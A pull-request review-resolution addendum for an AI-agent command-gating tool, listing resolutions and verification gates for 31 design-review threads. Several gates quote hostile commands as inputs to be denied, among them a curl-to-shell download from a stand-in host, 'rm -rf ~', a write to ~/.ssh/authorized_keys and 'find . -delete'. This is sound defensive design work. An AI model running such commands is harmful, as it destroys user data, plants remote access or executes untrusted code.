# Wave 9 concrete review-resolution addendum

- Repository: `Saber5656/agentgate`
- Pull request: #1
- Current PR head identity: the authoritative value is supplied by the immutable review manifest; this file intentionally omits the mutable commit SHA to avoid a self-referential identity.
- Current PR base pinned for this review: `b947835350b70949638c27ba2012c0223552ddea`
- This document records documentation-level handling for documentation-only PR findings. It is not a claim that implementation, runtime tests, build, CI, security, or release validation is complete.
- The immutable review manifest pins current head, base, and artifact blob identity; any later change invalidates this evidence and requires a fresh review.
- No PR review bot is triggered or rerun.

## Blocking specialist handoffs

| Role | Required evidence |
|---|---|
| QA/full validation | `tech-qa`/`tech-tester` must execute parser, policy, evaluator, audit, hook, CLI, docs-lint, and repository-full-validation gates for this head/base. |
| Security/privacy | `tech-security`/`tech-devopssec` must accept command execution, protected-path, ref-write, audit-integrity, and credential boundaries. |

Missing, pending, failed, skipped, cancelled, timed-out, stale, or non-accepting specialist/full-validation evidence blocks thread resolution and merge.

## Thread contracts

### 1. Thread `PRRT_kwDOTNj9uc6Oayd1` — Clarify audit-log schema evolution.

- File: `docs/decisions/ADR-003-audit-hash-chain.md`
- Line: 46
- Finding basis: Existing review finding “Clarify audit-log schema evolution.” at `docs/decisions/ADR-003-audit-hash-chain.md:46`.

**Normative resolution**: At `docs/decisions/ADR-003-audit-hash-chain.md:46`, Audit schema additions SHALL increment the record schema version; a verifier SHALL reject an unsupported version and unknown fields within a supported version.

**Focused verification gate**: Create v1 and v2 records; require v1 rejection of the added field, v2 acceptance, and rejection of an unknown v2 field.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 2. Thread `PRRT_kwDOTNj9uc6Oayd3` — Label the bare fences.

- File: `docs/DESIGN.md`
- Line: 113
- Finding basis: Existing review finding “Label the bare fences.” at `docs/DESIGN.md:113`.

**Normative resolution**: At the exact ranges `docs/DESIGN.md:99-113`, `docs/DESIGN.md:145-163`, `docs/DESIGN.md:178-184`, and `docs/DESIGN.md:385-389`, every fenced code block SHALL have an explicit language tag, using `text` for prose examples and the syntax language for code examples.

**Focused verification gate**: Inspect exactly `docs/DESIGN.md:99-113`, `docs/DESIGN.md:145-163`, `docs/DESIGN.md:178-184`, and `docs/DESIGN.md:385-389`; enumerate every fenced block in those four ranges, assert each opening fence has a non-empty language tag, and run `markdownlint-cli2 --rule MD040 docs/DESIGN.md` with zero MD040 findings.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 3. Thread `PRRT_kwDOTNj9uc6Oayd4` — Deny find -delete explicitly.

- File: `docs/DESIGN.md`
- Line: 360
- Finding basis: Existing review finding “Deny find -delete explicitly.” at `docs/DESIGN.md:360`.

**Normative resolution**: At `docs/DESIGN.md:360`, Any analyzed find unit containing -delete SHALL produce deny regardless of an otherwise matching allow rule.

**Focused verification gate**: Evaluate find . -delete under a matching allow rule and require deny with hazard find-delete.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 4. Thread `PRRT_kwDOTNj9uc6Oayd6` — Move the JSON example out of the markdown table.

- File: `docs/DESIGN.md`
- Line: 619
- Finding basis: Existing review finding “Move the JSON example out of the markdown table.” at `docs/DESIGN.md:619`.

**Normative resolution**: At `docs/DESIGN.md:619`, The permissionDecision JSON example SHALL be rendered in a fenced json block outside the Markdown table, with no raw pipe characters in table cells.

**Focused verification gate**: Extract exactly `docs/DESIGN.md:608-622`, parse the `§13.2 Behavior` table at lines 610-615, and assert it has three columns per row with no raw pipe inside a cell; assert the complete `permissionDecision` JSON example appears in a fenced `json` block outside that table, then run `markdownlint-cli2 --rule MD056 docs/DESIGN.md` and require zero MD056 findings.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 5. Thread `PRRT_kwDOTNj9uc6Oayd7` — Make the scaffold validation reach the stub, not Cobra parsing.

- File: `docs/issues/01-repo-scaffold-go-cli.md`
- Line: 77
- Finding basis: Existing review finding “Make the scaffold validation reach the stub, not Cobra parsing.” at `docs/issues/01-repo-scaffold-go-cli.md:77`.

**Normative resolution**: At `docs/issues/01-repo-scaffold-go-cli.md:77`, Issue 01 SHALL declare the --shell flag in the Cobra scaffold and validation SHALL invoke the stub ExitInternal path after parsing.

**Focused verification gate**: Run bin/agentgate check --shell ls and assert the flag parses and the scaffold stub reaches ExitInternal.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 6. Thread `PRRT_kwDOTNj9uc6OayeC` — Canonicalize explicit FILE args before comparing them to the global path.

- File: `docs/issues/04-policy-schema-and-validate.md`
- Line: 77
- Finding basis: Existing review finding “Canonicalize explicit FILE args before comparing them to the global path.” at `docs/issues/04-policy-schema-and-validate.md:77`.

**Normative resolution**: At `docs/issues/04-policy-schema-and-validate.md:77`, Policy validation SHALL resolve every explicit FILE argument to an absolute clean path before comparing it with the resolved global policy path.

**Focused verification gate**: Validate ./policy.yaml and its absolute spelling; assert both resolve to the same global layer.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 7. Thread `PRRT_kwDOTNj9uc6OayeI` — Avoid lossy Raw matching in vector mode.

- File: `docs/issues/05-glob-matching-primitives.md`
- Line: 47
- Finding basis: Existing review finding “Avoid lossy Raw matching in vector mode.” at `docs/issues/05-glob-matching-primitives.md:47`.

**Normative resolution**: At `docs/issues/05-glob-matching-primitives.md:47`, Vector mode SHALL skip Raw regex matching and SHALL match only the lossless argv representation; space-joined argv SHALL never be used.

**Focused verification gate**: Evaluate vectors [a b] and [a,b] against distinct rules; assert Raw does not treat them as equal.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 8. Thread `PRRT_kwDOTNj9uc6OayeL` — Carry structured hazard provenance on each unit.

- File: `docs/issues/08-policy-evaluation-engine.md`
- Line: 40
- Finding basis: Existing review finding “Carry structured hazard provenance on each unit.” at `docs/issues/08-policy-evaluation-engine.md:40`.

**Normative resolution**: At `docs/issues/08-policy-evaluation-engine.md:40`, Each analyzed unit result SHALL carry hazard kind, source span, unit index, and wrapper ancestry, and the evaluator SHALL expose that provenance in its trace.

**Focused verification gate**: Analyze nested-shell and redirect fixtures; assert each trace unit contains kind, span, index, and ancestry.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 9. Thread `PRRT_kwDOTNj9uc6OayeM` — Keep the constructor signature aligned across the stack.

- File: `docs/issues/09-redirects-and-protected-paths.md`
- Line: 37
- Finding basis: Existing review finding “Keep the constructor signature aligned across the stack.” at `docs/issues/09-redirects-and-protected-paths.md:37`.

**Normative resolution**: At `docs/issues/09-redirects-and-protected-paths.md:37`, The constructor SHALL be New(global, project *policy.File, home string), and Issues 08 and 11 SHALL pass the same resolved home value.

**Focused verification gate**: Compile Issues 08 and 11 against the constructor and assert the same home reaches evaluate.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 10. Thread `PRRT_kwDOTNj9uc6OayeP` — Resolve bare relative operands against the cwd.

- File: `docs/issues/09-redirects-and-protected-paths.md`
- Line: 47
- Finding basis: Existing review finding “Resolve bare relative operands against the cwd.” at `docs/issues/09-redirects-and-protected-paths.md:47`.

**Normative resolution**: At `docs/issues/09-redirects-and-protected-paths.md:47`, The analyzer SHALL maintain a static cwd scope after each literal cd and SHALL resolve subsequent bare relative operands against that scope before protected-path matching.

**Focused verification gate**: Evaluate cd ~/.ssh && echo x > authorized_keys and require the redirect to resolve under ~/.ssh.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 11. Thread `PRRT_kwDOTNj9uc6OayeQ` — Make audit failures fail closed on hook paths.

- File: `docs/issues/10-audit-log-writer-hash-chain.md`
- Line: 82
- Finding basis: Existing review finding “Make audit failures fail closed on hook paths.” at `docs/issues/10-audit-log-writer-hash-chain.md:82`.

**Normative resolution**: At `docs/issues/10-audit-log-writer-hash-chain.md:82`, A hook action SHALL return ask with the audit error when append or fsync fails; check and exec paths SHALL return non-zero and SHALL never continue as allowed actions.

**Focused verification gate**: Inject append and fsync failures into hook, check, and exec; assert hook asks and non-hook paths fail without execution.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 12. Thread `PRRT_kwDOTNj9uc6OayeS` — Use a collision-resistant backup suffix.

- File: `docs/issues/14-init-and-starter-policy.md`
- Line: 31
- Finding basis: Existing review finding “Use a collision-resistant backup suffix.” at `docs/issues/14-init-and-starter-policy.md:31`.

**Normative resolution**: At `docs/issues/14-init-and-starter-policy.md:31`, Policy backups SHALL use a cryptographically random 128-bit suffix and exclusive creation, so an existing backup is never replaced.

**Focused verification gate**: Run two forced initializations in parallel and assert distinct backup names, preserved original content, and no replacement.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 13. Thread `PRRT_kwDOTNj9uc6OayeW` — Keep the required reason prefix intact before truncating.

- File: `docs/issues/15-claude-code-hook-adapter.md`
- Line: 42
- Finding basis: Existing review finding “Keep the required reason prefix intact before truncating.” at `docs/issues/15-claude-code-hook-adapter.md:42`.

**Normative resolution**: At `docs/issues/15-claude-code-hook-adapter.md:42`, The hook adapter SHALL reserve the structured reason prefix and hazards suffix within 500 characters and SHALL truncate only the free-form reason tail.

**Focused verification gate**: Create a reason longer than 500 characters with rule and hazard metadata; assert both structured portions survive.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 14. Thread `PRRT_kwDOTNj9uc6OayeX` — Don't return success for partial chain checks.

- File: `docs/issues/17-log-verify-command.md`
- Line: 40
- Finding basis: Existing review finding “Don't return success for partial chain checks.” at `docs/issues/17-log-verify-command.md:40`.

**Normative resolution**: At `docs/issues/17-log-verify-command.md:40`, Log verification SHALL reject every non-consecutive file selection with non-zero and SHALL never report successful full-chain verification for a partial selection.

**Focused verification gate**: Run log verify with non-consecutive files and require non-zero with no success marker; verify a consecutive pair as control.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 15. Thread `PRRT_kwDOTNj9uc6OayeZ` — Clarify what is actually signed.

- File: `docs/issues/21-release-workflow.md`
- Line: 11
- Finding basis: Existing review finding “Clarify what is actually signed.” at `docs/issues/21-release-workflow.md:11`.

**Normative resolution**: At `docs/issues/21-release-workflow.md:11`, Release documentation SHALL describe only an unsigned SHA-256 checksums.txt; it SHALL not call that artifact signed.

**Focused verification gate**: Search release docs for signed-checksum and code-signing claims; require unsigned checksums.txt wording.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 16. Thread `PRRT_kwDOTNj9uc6Oayeb` — Pin the release actions exactly.

- File: `docs/issues/21-release-workflow.md`
- Line: 37
- Finding basis: Existing review finding “Pin the release actions exactly.” at `docs/issues/21-release-workflow.md:37`.

**Normative resolution**: At `docs/issues/21-release-workflow.md:37`, Every third-party uses entry in release workflows SHALL be pinned to an exact commit SHA, including checkout, setup, and GoReleaser actions.

**Focused verification gate**: Run actionlint and a uses scanner; assert every third-party ref is a 40-character commit SHA.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 17. Thread `PRRT_kwDOTNj9uc6OayqQ` — Deny bare relative protected path operands

- File: `docs/issues/09-redirects-and-protected-paths.md`
- Line: 47
- Finding basis: Existing review finding “Deny bare relative protected path operands” at `docs/issues/09-redirects-and-protected-paths.md:47`.

**Normative resolution**: At `docs/issues/09-redirects-and-protected-paths.md:47`, Protected-path matching SHALL resolve every bare non-option operand against the evaluation cwd before applying protected globs.

**Focused verification gate**: Evaluate rm .env, tee .env, and chmod 600 id_rsa from a cwd fixture and require protected escalation.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 18. Thread `PRRT_kwDOTNj9uc6OayqS` — Cover option-only pipe-to-shell forms

- File: `docs/issues/14-init-and-starter-policy.md`
- Line: 70
- Finding basis: Existing review finding “Cover option-only pipe-to-shell forms” at `docs/issues/14-init-and-starter-policy.md:70`.

**Normative resolution**: At `docs/issues/14-init-and-starter-policy.md:70`, A shell unit with -s receiving script text through a pipe SHALL be classified as pipe-to-shell and SHALL be denied.

**Focused verification gate**: Evaluate curl https://x/i.sh | sh -s and the bash -s form; require pipe-to-shell deny.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 19. Thread `PRRT_kwDOTNj9uc6OayqT` — Exclude the global starter policy from project validation

- File: `docs/issues/20-user-docs-and-examples.md`
- Line: 52
- Finding basis: Existing review finding “Exclude the global starter policy from project validation” at `docs/issues/20-user-docs-and-examples.md:52`.

**Normative resolution**: At `docs/issues/20-user-docs-and-examples.md:52`, The project-policy validation fixture SHALL load examples/starter-policy.yaml as a global-layer fixture, not as a project-layer file.

**Focused verification gate**: Validate starter policy through the examples sweep as a global fixture and assert no E_ENFORCED_IN_PROJECT.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 20. Thread `PRRT_kwDOTNj9uc6OayqW` — Fail closed when a Bash command is missing

- File: `docs/issues/15-claude-code-hook-adapter.md`
- Line: 44
- Finding basis: Existing review finding “Fail closed when a Bash command is missing” at `docs/issues/15-claude-code-hook-adapter.md:44`.

**Normative resolution**: At `docs/issues/15-claude-code-hook-adapter.md:44`, A Claude Code Bash event without tool_input.command SHALL return an adapter error with permissionDecision ask and SHALL never evaluate an empty command as allow.

**Focused verification gate**: Send hook JSON without tool_input.command; assert ask and adapter error, never allow.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 21. Thread `PRRT_kwDOTNj9uc6OayqX` — Consume timeout option arguments before unwrapping

- File: `docs/issues/07-wrapper-unwrap-and-nested-shells.md`
- Line: 37
- Finding basis: Existing review finding “Consume timeout option arguments before unwrapping” at `docs/issues/07-wrapper-unwrap-and-nested-shells.md:37`.

**Normative resolution**: At `docs/issues/07-wrapper-unwrap-and-nested-shells.md:37`, Timeout unwrapping SHALL consume the argument of -s/--signal and -k/--kill-after before reading duration and wrapped program.

**Focused verification gate**: Unwrap timeout -s KILL -k 2s 30 rm -rf ~ and assert wrapped program is rm, not 30.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 22. Thread `PRRT_kwDOTNj9uc6Oayqa` — Deny the short force-push flag

- File: `docs/issues/14-init-and-starter-policy.md`
- Line: 74
- Finding basis: Existing review finding “Deny the short force-push flag” at `docs/issues/14-init-and-starter-policy.md:74`.

**Normative resolution**: At `docs/issues/14-init-and-starter-policy.md:74`, The force-push deny rule SHALL match git push -f and git push --force before any ordinary push rule.

**Focused verification gate**: Evaluate git push -f and git push --force; assert deny for both.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 23. Thread `PRRT_kwDOTNj9uc6Oayqb` — Narrow the git read-only allow rule

- File: `docs/issues/14-init-and-starter-policy.md`
- Line: 80
- Finding basis: Existing review finding “Narrow the git read-only allow rule” at `docs/issues/14-init-and-starter-policy.md:80`.

**Normative resolution**: At `docs/issues/14-init-and-starter-policy.md:80`, The read-only Git allowlist SHALL allow only git branch --list/-l and git remote/-v; branch deletion and remote mutation forms SHALL be denied.

**Focused verification gate**: Evaluate git branch -D main and git remote remove origin; assert neither matches read-only allow.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 24. Thread `PRRT_kwDOTNj9uc6Oayqc` — Remove exec-capable tools from read-only basics

- File: `docs/issues/14-init-and-starter-policy.md`
- Line: 77
- Finding basis: Existing review finding “Remove exec-capable tools from read-only basics” at `docs/issues/14-init-and-starter-policy.md:77`.

**Normative resolution**: At `docs/issues/14-init-and-starter-policy.md:77`, The starter policy SHALL deny rg --pre and fd -x/-X execution forms before the unconditional read-only rule.

**Focused verification gate**: Evaluate rg --pre=rm and fd -x rm; assert deny and nested-execution hazard.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 25. Thread `PRRT_kwDOTNj9uc6Oayqf` — Add YAML tags for snake_case fields

- File: `docs/issues/04-policy-schema-and-validate.md`
- Line: 29
- Finding basis: Existing review finding “Add YAML tags for snake_case fields” at `docs/issues/04-policy-schema-and-validate.md:29`.

**Normative resolution**: At `docs/issues/04-policy-schema-and-validate.md:29`, Every snake_case policy field, including on_opaque, protected_paths, and any_arg, SHALL have an explicit YAML tag matching its documented key.

**Focused verification gate**: Decode snake_case YAML with KnownFields true and assert every documented field populates.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 26. Thread `PRRT_kwDOTNj9uc6Oayqh` — Test project policies from the project root

- File: `docs/issues/18-policy-test-command.md`
- Line: 35
- Finding basis: Existing review finding “Test project policies from the project root” at `docs/issues/18-policy-test-command.md:35`.

**Normative resolution**: At `docs/issues/18-policy-test-command.md:35`, Project policy tests SHALL execute from the parent of .agentgate while the policy file remains at <repo>/.agentgate/policy.yaml.

**Focused verification gate**: Run project policy tests from repository root and assert cwd matchers use that root.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 27. Thread `PRRT_kwDOTNj9uc6Oayqj` — Match expected rules only on final contributors

- File: `docs/issues/18-policy-test-command.md`
- Line: 36
- Finding basis: Existing review finding “Match expected rules only on final contributors” at `docs/issues/18-policy-test-command.md:36`.

**Normative resolution**: At `docs/issues/18-policy-test-command.md:36`, A policy-test rule assertion SHALL compare the expected rule only with the unit or units that contributed the final maximum-severity decision.

**Focused verification gate**: Use a multi-unit test with an unrelated expected rule; assert it fails unless the final contributor has that rule.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 28. Thread `PRRT_kwDOTNj9uc6Oayqm` — Show the rule behind the final decision

- File: `docs/issues/16-log-query-commands.md`
- Line: 32
- Finding basis: Existing review finding “Show the rule behind the final decision” at `docs/issues/16-log-query-commands.md:32`.

**Normative resolution**: At `docs/issues/16-log-query-commands.md:32`, The log renderer SHALL select the first source-order unit whose action equals the final severity and SHALL display that unit's deciding rule.

**Focused verification gate**: Render a log where the second unit is final deny; assert the displayed rule is the second unit.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 29. Thread `PRRT_kwDOTNj9uc6Oayqo` — Add issue 20 before packaging LICENSE

- File: `docs/issues/21-release-workflow.md`
- Line: 30
- Finding basis: Existing review finding “Add issue 20 before packaging LICENSE” at `docs/issues/21-release-workflow.md:30`.

**Normative resolution**: At `docs/issues/21-release-workflow.md:30`, Issue 21 SHALL list Issue 20 as a prerequisite in the authoritative dependency graph.

**Focused verification gate**: Build ISSUE_PLAN graph and assert 20 precedes 21.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 30. Thread `PRRT_kwDOTNj9uc6Oayqr` — Account for cd before relative protected writes

- File: `docs/issues/09-redirects-and-protected-paths.md`
- Line: 40
- Finding basis: Existing review finding “Account for cd before relative protected writes” at `docs/issues/09-redirects-and-protected-paths.md:40`.

**Normative resolution**: At `docs/issues/09-redirects-and-protected-paths.md:40`, The analyzer SHALL update cwd only for a literal cd; a dynamic cd SHALL mark subsequent relative writes opaque and protected.

**Focused verification gate**: Evaluate literal cd followed by protected redirect and dynamic cd followed by one; assert scoped resolution and opaque escalation.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

### 31. Thread `PRRT_kwDOTNj9uc6Oayqu` — Keep absent policy homes on the built-in path

- File: `docs/issues/15-claude-code-hook-adapter.md`
- Line: 61
- Finding basis: Existing review finding “Keep absent policy homes on the built-in path” at `docs/issues/15-claude-code-hook-adapter.md:61`.

**Normative resolution**: At `docs/issues/15-claude-code-hook-adapter.md:61`, A missing policy home or policy file SHALL be an empty layer using built-in deny defaults; only an invalid or unreadable path SHALL produce a configuration error.

**Focused verification gate**: Run with missing policy home and assert built-in deny; run with unreadable policy and assert configuration error.

**Completion boundary**: This is a design-level response contract only. Resolve this thread only after its focused gate, applicable specialist handoff, and repository full validation are terminal success for the current head/base identity.

## Merge boundary

- `gate-task-evaluator` must re-fetch PR state, current head/base, required-check inventory, review decision, unresolved thread state, policy version, and merge candidate immediately before any merge mutation.
- `github_mergeable` and a successful CodeRabbit status are not merge authorization.
- This task permits at most one PR Bot review. This artifact authorizes no Bot trigger or rerun.
